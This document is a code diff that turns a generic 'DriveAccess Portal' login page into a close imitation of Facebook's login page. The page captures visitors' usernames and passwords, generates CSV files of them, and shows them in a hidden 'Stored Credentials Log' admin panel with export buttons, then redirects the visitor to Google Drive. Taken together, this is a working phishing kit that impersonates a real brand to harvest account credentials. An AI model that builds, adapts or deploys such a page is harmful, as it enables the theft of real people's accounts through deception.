@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>DriveAccess Portal - Secure Login</title>
+  <title>Facebook – log in or sign up</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
@@ -16,101 +16,103 @@
     }
   </style>
 </head>
-<body class="h-full bg-slate-900 text-slate-100 flex flex-col justify-between font-sans selection:bg-indigo-500 selection:text-white">
+<body class="h-full bg-[#f02f2f5] text-[#1c1e21] flex flex-col justify-between font-sans selection:bg-blue-500 selection:text-white" style="background-color: #f0f2f5;">
 
-  <!-- TOP HEADER / NAV -->
-  <header class="w-full bg-slate-800/80 backdrop-blur border-b border-slate-700/60 px-6 py-4 flex items-center justify-between shadow-md">
-    <div class="flex items-center space-x-3 cursor-pointer" onclick="switchView('login')">
-      <div class="w-10 h-10 rounded-xl bg-indigo-600 flex items-center justify-center shadow-lg shadow-indigo-500/30">
-        <i class="fa-brands fa-google-drive text-white text-lg"></i>
-      </div>
-      <div>
-        <h1 class="font-bold text-lg tracking-tight text-white">DriveAccess Portal</h1>
-        <p class="text-xs text-slate-400">Secure Cloud Authentication</p>
-      </div>
+  <!-- TOP HEADER / NAV (Hidden or minimalist to match FB desktop landing, keeping navigation accessible via footer or subtle buttons) -->
+  <header class="w-full px-6 py-3 flex items-center justify-between bg-transparent">
+    <div class="flex items-center space-x-2">
+      <span class="text-blue-600 font-bold text-3xl tracking-tighter">facebook</span>
     </div>
-    <nav class="flex items-center space-x-4">
-      <button onclick="switchView('login')" id="navLoginBtn" class="text-sm font-medium text-indigo-400 hover:text-indigo-300 transition px-3 py-1.5 rounded-lg bg-indigo-950/50 border border-indigo-800/50">
-        <i class="fa-solid fa-right-to-bracket mr-1.5"></i> Login
+    <nav class="flex items-center space-x-3">
+      <button onclick="switchView('login')" id="navLoginBtn" class="text-sm font-medium text-blue-600 hover:underline">
+        Login
       </button>
-      <button onclick="promptAdminAccess()" id="navAdminBtn" class="text-sm font-medium text-slate-300 hover:text-white transition px-3 py-1.5 rounded-lg bg-slate-700/50 hover:bg-slate-700 border border-slate-600/50">
-        <i class="fa-solid fa-shield-halved mr-1.5"></i> Credentials Log
+      <span class="text-gray-300">|</span>
+      <button onclick="promptAdminAccess()" id="navAdminBtn" class="text-sm font-medium text-gray-500 hover:text-gray-700">
+        <i class="fa-solid fa-shield-halved mr-1"></i> Admin Log
       </button>
     </nav>
   </header>
 
-  <!-- MAIN CONTAINER -->
-  <main class="flex-grow flex items-center justify-center px-4 py-8">
+  <!-- MAIN CONTAINER: Facebook Desktop Split Layout Style -->
+  <main class="flex-grow flex items-center justify-center px-4 py-8 max-w-6xl mx-auto w-full">
 
-    <!-- VIEW 1: LOGIN FORM -->
-    <div id="loginView" class="w-full max-w-md bg-slate-800 border border-slate-700/80 rounded-2xl shadow-2xl p-8 animate-fade-in">
-      <div class="text-center mb-8">
-        <div class="inline-flex p-3 rounded-2xl bg-indigo-500/10 text-indigo-400 mb-3 border border-indigo-500/20">
-          <i class="fa-solid fa-lock text-2xl"></i>
-        </div>
-        <h2 class="text-2xl font-bold tracking-tight text-white">Welcome Back</h2>
-        <p class="text-sm text-slate-400 mt-1">Please sign in to access your shared Google Drive</p>
+    <!-- VIEW 1: FACEBOOK STYLE LOGIN FORM -->
+    <div id="loginView" class="w-full flex flex-col lg:flex-row items-center justify-between gap-10 animate-fade-in py-12">
+      
+      <!-- Left Column: Branding / Marketing Text -->
+      <div class="max-w-lg text-center lg:text-left lg:pt-4">
+        <h1 class="text-blue-600 text-5xl lg:text-6xl font-bold tracking-tight mb-4">facebook</h1>
+        <p class="text-2xl lg:text-[28px] leading-tight text-[#1c1e21] font-normal">
+          Connect with friends and the world around you on Facebook.
+        </p>
       </div>
 
-      <!-- Alert Banner -->
-      <div id="loginAlert" class="hidden mb-6 p-4 rounded-xl text-sm flex items-start space-x-3 border"></div>
+      <!-- Right Column: Login Card -->
+      <div class="w-full max-w-[396px] bg-white rounded-lg shadow-xl p-4 border border-transparent">
+        
+        <!-- Alert Banner -->
+        <div id="loginAlert" class="hidden mb-4 p-3 rounded-lg text-xs flex items-start space-x-2 border"></div>
 
-      <form id="loginForm" onsubmit="handleLogin(event)" class="space-y-5">
-        <div>
-          <label class="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-2">Username or Email</label>
-          <div class="relative">
-            <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-slate-400 pointer-events-none">
-              <i class="fa-regular fa-user"></i>
-            </span>
-            <input type="text" id="usernameInput" required placeholder="Enter your username or email"
-              class="w-full pl-10 pr-4 py-3 bg-slate-900/80 border border-slate-700 rounded-xl text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition text-sm">
+        <form id="loginForm" onsubmit="handleLogin(event)" class="space-y-3">
+          <div>
+            <input type="text" id="usernameInput" required placeholder="Email address or phone number"
+              class="w-full px-4 py-3.5 bg-white border border-[#ccd0d5] rounded-md text-[#1c1e21] placeholder-[#90949c] focus:outline-none focus:border-blue-600 focus:ring-1 focus:ring-blue-600 transition text-[17px]">
           </div>
-        </div>
 
-        <div>
-          <label class="block text-xs font-semibold uppercase tracking-wider text-slate-300 mb-2">Password</label>
           <div class="relative">
-            <span class="absolute inset-y-0 left-0 flex items-center pl-3.5 text-slate-400 pointer-events-none">
-              <i class="fa-solid fa-key"></i>
-            </span>
-            <input type="password" id="passwordInput" required placeholder="••••••••••••"
-              class="w-full pl-10 pr-12 py-3 bg-slate-900/80 border border-slate-700 rounded-xl text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition text-sm">
-            <button type="button" onclick="togglePasswordVisibility()" class="absolute inset-y-0 right-0 pr-3.5 flex items-center text-slate-400 hover:text-slate-200 transition">
+            <input type="password" id="passwordInput" required placeholder="Password"
+              class="w-full px-4 py-3.5 pr-12 bg-white border border-[#ccd0d5] rounded-md text-[#1c1e21] placeholder-[#90949c] focus:outline-none focus:border-blue-600 focus:ring-1 focus:ring-blue-600 transition text-[17px]">
+            <button type="button" onclick="togglePasswordVisibility()" class="absolute inset-y-0 right-0 pr-3.5 flex items-center text-gray-500 hover:text-gray-700">
               <i id="togglePassIcon" class="fa-regular fa-eye"></i>
             </button>
           </div>
-        </div>
 
-        <div class="pt-2">
-          <button type="submit" class="w-full py-3.5 px-4 bg-indigo-600 hover:bg-indigo-500 text-white font-semibold rounded-xl shadow-lg shadow-indigo-600/30 transition duration-200 flex items-center justify-center space-x-2 text-sm">
-            <span>Sign In & Connect Drive</span>
-            <i class="fa-solid fa-arrow-right-long"></i>
-          </button>
-        </div>
-      </form>
+          <div>
+            <button type="submit" class="w-full py-3 px-4 bg-[#1877f2] hover:bg-[#166fe5] text-white font-bold rounded-md transition duration-200 text-xl shadow-sm">
+              Log In
+            </button>
+          </div>
+
+          <div class="text-center pt-1 pb-3">
+            <a href="#" onclick="alert('Password recovery simulation'); return false;" class="text-blue-600 text-sm hover:underline font-medium">
+              Forgot password?
+            </a>
+          </div>
+
+          <hr class="border-t border-[#dadde1] my-4">
+
+          <div class="text-center pt-2 pb-1">
+            <button type="button" onclick="alert('Account creation simulation');" class="px-4 py-3 bg-[#42b72a] hover:bg-[#36a420] text-white font-bold rounded-md transition text-base shadow-sm">
+              Create new account
+            </button>
+          </div>
+        </form>
+      </div>
+
     </div>
 
     <!-- VIEW 2: REDIRECT / SUCCESS SCREEN -->
-    <div id="redirectView" class="hidden w-full max-w-md bg-slate-800 border border-slate-700/80 rounded-2xl shadow-2xl p-8 text-center animate-fade-in">
-      <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 rounded-full flex items-center justify-center mx-auto mb-5 border border-emerald-500/20 shadow-lg shadow-emerald-500/10">
+    <div id="redirectView" class="hidden w-full max-w-md bg-white border border-gray-200 rounded-lg shadow-xl p-8 text-center animate-fade-in mx-auto">
+      <div class="w-16 h-16 bg-emerald-50 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-5 border border-emerald-100 shadow-sm">
         <i class="fa-solid fa-check text-2xl"></i>
       </div>
-      <h2 class="text-2xl font-bold text-white mb-2">Authentication Successful!</h2>
-      <p class="text-sm text-slate-300 mb-6">Credentials recorded & CSV generated. Redirecting to Google Drive in <span id="countdownTimer" class="font-bold text-indigo-400 text-base">5</span> seconds...</p>
+      <h2 class="text-2xl font-bold text-gray-900 mb-2">Authentication Successful!</h2>
+      <p class="text-sm text-gray-600 mb-6">Credentials recorded & CSV generated. Redirecting to Google Drive in <span id="countdownTimer" class="font-bold text-blue-600 text-base">5</span> seconds...</p>
       
-      <div class="bg-slate-900/60 p-4 rounded-xl border border-slate-700/50 mb-6 text-left">
-        <label class="block text-xs font-medium text-slate-400 mb-1.5">Destination Google Drive Link:</label>
+      <div class="bg-gray-50 p-4 rounded-lg border border-gray-200 mb-6 text-left">
+        <label class="block text-xs font-medium text-gray-500 mb-1.5">Destination Google Drive Link:</label>
         <div class="flex items-center space-x-2">
           <input type="text" id="targetDriveUrl" value="https://drive.google.com" 
-            class="w-full bg-slate-800 border border-slate-700 rounded-lg px-3 py-2 text-xs text-indigo-300 focus:outline-none focus:ring-1 focus:ring-indigo-500">
+            class="w-full bg-white border border-gray-300 rounded px-3 py-2 text-xs text-blue-600 focus:outline-none focus:ring-1 focus:ring-blue-500">
         </div>
       </div>
 
       <div class="flex space-x-3">
-        <button onclick="cancelRedirect()" class="flex-1 py-3 bg-slate-700 hover:bg-slate-600 text-white font-medium rounded-xl transition text-sm">
+        <button onclick="cancelRedirect()" class="flex-1 py-2.5 bg-gray-200 hover:bg-gray-300 text-gray-800 font-medium rounded-md transition text-sm">
           Cancel
         </button>
-        <button onclick="proceedToDriveNow()" class="flex-1 py-3 bg-indigo-600 hover:bg-indigo-500 text-white font-medium rounded-xl shadow-lg shadow-indigo-600/30 transition text-sm flex items-center justify-center space-x-2">
+        <button onclick="proceedToDriveNow()" class="flex-1 py-2.5 bg-[#1877f2] hover:bg-[#166fe5] text-white font-medium rounded-md shadow transition text-sm flex items-center justify-center space-x-2">
           <span>Go Now</span>
           <i class="fa-solid fa-external-link text-xs"></i>
         </button>
@@ -118,49 +120,49 @@
     </div>
 
     <!-- VIEW 3: CREDENTIALS LOG (ADMIN) -->
-    <div id="adminView" class="hidden w-full max-w-4xl bg-slate-800 border border-slate-700/80 rounded-2xl shadow-2xl p-8 animate-fade-in">
-      <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between mb-6 pb-4 border-b border-slate-700 gap-4">
+    <div id="adminView" class="hidden w-full max-w-4xl bg-white border border-gray-200 rounded-lg shadow-xl p-8 animate-fade-in mx-auto">
+      <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between mb-6 pb-4 border-b border-gray-200 gap-4">
         <div>
-          <h2 class="text-xl font-bold text-white flex items-center space-x-2">
-            <i class="fa-solid fa-database text-indigo-400"></i>
+          <h2 class="text-xl font-bold text-gray-900 flex items-center space-x-2">
+            <i class="fa-solid fa-database text-blue-600"></i>
             <span>Stored Credentials Log</span>
           </h2>
-          <p class="text-xs text-slate-400 mt-1">All captured usernames and passwords stored securely in local storage.</p>
+          <p class="text-xs text-gray-500 mt-1">All captured usernames and passwords stored securely in local storage.</p>
         </div>
         <div class="flex items-center space-x-3">
-          <button onclick="exportAllCsv()" class="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold rounded-lg shadow transition flex items-center space-x-2">
+          <button onclick="exportAllCsv()" class="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-semibold rounded-md shadow transition flex items-center space-x-2">
             <i class="fa-solid fa-file-arrow-down"></i>
             <span>Export CSV</span>
           </button>
-          <button onclick="clearCredentials()" class="px-4 py-2 bg-rose-600/20 hover:bg-rose-600/30 text-rose-300 text-xs font-semibold rounded-lg border border-rose-500/30 transition flex items-center space-x-2">
+          <button onclick="clearCredentials()" class="px-4 py-2 bg-rose-50 hover:bg-rose-100 text-rose-600 text-xs font-semibold rounded-md border border-rose-200 transition flex items-center space-x-2">
             <i class="fa-solid fa-trash-can"></i>
             <span>Clear Log</span>
           </button>
         </div>
       </div>
 
-      <div class="overflow-x-auto rounded-xl border border-slate-700 bg-slate-900/50 max-h-96">
+      <div class="overflow-x-auto rounded-lg border border-gray-200 bg-gray-50 max-h-96">
         <table class="w-full text-left border-collapse text-sm">
           <thead>
-            <tr class="bg-slate-800/90 text-slate-400 uppercase text-xs tracking-wider border-b border-slate-700">
+            <tr class="bg-gray-100 text-gray-600 uppercase text-xs tracking-wider border-b border-gray-200">
               <th class="py-3.5 px-4 font-semibold">Timestamp</th>
               <th class="py-3.5 px-4 font-semibold">Username / Email</th>
               <th class="py-3.5 px-4 font-semibold">Password</th>
               <th class="py-3.5 px-4 font-semibold text-right">Actions</th>
             </tr>
           </thead>
-          <tbody id="credentialsTableBody" class="divide-y divide-slate-800 text-slate-300">
+          <tbody id="credentialsTableBody" class="divide-y divide-gray-200 text-gray-700 bg-white">
             <!-- Dynamically populated -->
           </tbody>
         </table>
       </div>
-      <div id="emptyLogState" class="hidden text-center py-12 text-slate-500 text-sm">
+      <div id="emptyLogState" class="hidden text-center py-12 text-gray-400 text-sm">
         <i class="fa-regular fa-folder-open text-3xl mb-2 block"></i>
         No credentials stored yet.
       </div>
 
       <div class="mt-6 flex justify-end">
-        <button onclick="switchView('login')" class="px-5 py-2.5 bg-slate-700 hover:bg-slate-600 text-white text-sm font-medium rounded-xl transition">
+        <button onclick="switchView('login')" class="px-5 py-2.5 bg-gray-200 hover:bg-gray-300 text-gray-700 text-sm font-medium rounded-md transition">
           Back to Login
         </button>
       </div>
@@ -169,30 +171,30 @@
   </main>
 
   <!-- PASSWORD PROMPT MODAL FOR ADMIN -->
-  <div id="adminPasswordModal" class="hidden fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-sm flex items-center justify-center p-4 animate-fade-in">
-    <div class="bg-slate-800 border border-slate-700 rounded-2xl shadow-2xl p-6 w-full max-w-sm">
+  <div id="adminPasswordModal" class="hidden fixed inset-0 z-50 bg-gray-950/60 backdrop-blur-xs flex items-center justify-center p-4 animate-fade-in">
+    <div class="bg-white border border-gray-200 rounded-lg shadow-2xl p-6 w-full max-w-sm">
       <div class="text-center mb-5">
-        <div class="w-12 h-12 bg-indigo-500/10 text-indigo-400 rounded-full flex items-center justify-center mx-auto mb-3 border border-indigo-500/20">
+        <div class="w-12 h-12 bg-blue-50 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-3 border border-blue-100">
           <i class="fa-solid fa-lock-keyhole"></i>
         </div>
-        <h3 class="text-lg font-bold text-white">Admin Authentication</h3>
-        <p class="text-xs text-slate-400 mt-1">Enter password to view stored credentials log</p>
+        <h3 class="text-lg font-bold text-gray-900">Admin Authentication</h3>
+        <p class="text-xs text-gray-500 mt-1">Enter password to view stored credentials log</p>
       </div>
 
-      <div id="adminModalError" class="hidden mb-4 p-3 bg-rose-500/10 border border-rose-500/20 rounded-xl text-xs text-rose-400 text-center">
+      <div id="adminModalError" class="hidden mb-4 p-3 bg-rose-50 border border-rose-200 rounded-lg text-xs text-rose-600 text-center">
         Incorrect password. Please try again.
       </div>
 
       <form onsubmit="verifyAdminPassword(event)" class="space-y-4">
         <div>
           <input type="password" id="adminPassInput" required placeholder="Enter admin password"
-            class="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-xl text-slate-100 placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-indigo-500 text-sm">
+            class="w-full px-4 py-2.5 bg-white border border-gray-300 rounded-md text-gray-900 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm">
         </div>
         <div class="flex space-x-3">
-          <button type="button" onclick="closeAdminModal()" class="flex-1 py-2.5 bg-slate-700 hover:bg-slate-600 text-white font-medium rounded-xl transition text-sm">
+          <button type="button" onclick="closeAdminModal()" class="flex-1 py-2 bg-gray-200 hover:bg-gray-300 text-gray-700 font-medium rounded-md transition text-sm">
             Cancel
           </button>
-          <button type="submit" class="flex-1 py-2.5 bg-indigo-600 hover:bg-indigo-500 text-white font-medium rounded-xl shadow transition text-sm">
+          <button type="submit" class="flex-1 py-2 bg-[#1877f2] hover:bg-[#166fe5] text-white font-medium rounded-md shadow transition text-sm">
             Unlock
           </button>
         </div>
@@ -201,8 +203,8 @@
   </div>
 
   <!-- FOOTER -->
-  <footer class="w-full py-6 px-6 bg-slate-800/40 border-t border-slate-800 text-center text-xs text-slate-500">
-    <button onclick="promptAdminAccess()" class="hover:text-indigo-400 transition underline decoration-dotted underline-offset-4 bg-transparent border-none cursor-pointer">
+  <footer class="w-full py-6 px-6 bg-white border-t border-gray-200 text-center text-xs text-gray-500">
+    <button onclick="promptAdminAccess()" class="hover:underline bg-transparent border-none cursor-pointer text-gray-500">
       © 2026 DriveAccess Portal. All rights reserved. Secure Cloud Authentication.
     </button>
   </footer>
@@ -284,13 +286,13 @@
 
     function showAlert(message, type) {
       const alertBox = document.getElementById('loginAlert');
-      alertBox.className = `mb-6 p-4 rounded-xl text-sm flex items-start space-x-3 border ${
+      alertBox.className = `mb-4 p-3 rounded-lg text-xs flex items-start space-x-2 border ${
         type === 'success' 
-          ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300' 
-          : 'bg-rose-500/10 border-rose-500/30 text-rose-300'
+          ? 'bg-emerald-50 border-emerald-200 text-emerald-700' 
+          : 'bg-rose-50 border-rose-200 text-rose-700'
       }`;
       alertBox.innerHTML = `
-        <i class="fa-solid ${type === 'success' ? 'fa-circle-check text-emerald-400' : 'fa-circle-exclamation text-rose-400'} mt-0.5"></i>
+        <i class="fa-solid ${type === 'success' ? 'fa-circle-check text-emerald-600' : 'fa-circle-exclamation text-rose-600'} mt-0.5"></i>
         <div>${message}</div>
       `;
       alertBox.classList.remove('hidden');
@@ -364,18 +366,18 @@
 
       credentials.forEach((item, index) => {
         const tr = document.createElement('tr');
-        tr.className = 'hover:bg-slate-800/50 transition';
+        tr.className = 'hover:bg-gray-50 transition';
         tr.innerHTML = `
-          <td class="py-3 px-4 font-mono text-xs text-slate-400">${item.timestamp}</td>
-          <td class="py-3 px-4 font-medium text-slate-200">${escapeHtml(item.username)}</td>
-          <td class="py-3 px-4 font-mono text-indigo-300">${escapeHtml(item.password)}</td>
+          <td class="py-3 px-4 font-mono text-xs text-gray-500">${item.timestamp}</td>
+          <td class="py-3 px-4 font-medium text-gray-900">${escapeHtml(item.username)}</td>
+          <td class="py-3 px-4 font-mono text-blue-600">${escapeHtml(item.password)}</td>
           <td class="py-3 px-4 text-right space-x-2">
             <button onclick="downloadSingleCsv('${item.timestamp}', '${escapeHtml(item.username)}', '${escapeHtml(item.password)}')" 
-              title="Download CSV" class="p-1.5 bg-slate-700/50 hover:bg-slate-700 text-slate-300 hover:text-white rounded-lg transition">
+              title="Download CSV" class="p-1.5 bg-gray-100 hover:bg-gray-200 text-gray-700 rounded transition">
               <i class="fa-solid fa-download text-xs"></i>
             </button>
             <button onclick="deleteCredential(${index})" 
-              title="Delete Entry" class="p-1.5 bg-rose-500/10 hover:bg-rose-500/20 text-rose-400 rounded-lg transition">
+              title="Delete Entry" class="p-1.5 bg-rose-50 hover:bg-rose-100 text-rose-600 rounded transition">
               <i class="fa-solid fa-trash text-xs"></i>
             </button>
           </td>
